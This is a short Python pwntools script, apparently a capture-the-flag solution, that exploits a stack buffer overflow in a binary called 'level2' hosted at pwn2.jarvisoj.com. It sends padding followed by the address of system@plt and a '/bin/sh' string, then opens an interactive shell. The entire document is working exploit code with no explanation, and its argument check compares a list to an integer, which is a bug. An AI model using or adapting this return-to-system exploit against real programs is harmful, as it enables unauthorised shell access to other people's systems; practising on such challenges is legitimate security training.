from pwn import *
import sys
if(sys.argv<2):
	io = process('./level2')
else:
	io = remote('pwn2.jarvisoj.com',9878)
binsh_addr = 0x0804A024
system_plt = 0x08048320

payload = 'A'*(0x88+4)+p32(system_plt)+'bbbb'+p32(binsh_addr)
io.sendlineafter('Input:',payload)
io.interactive()
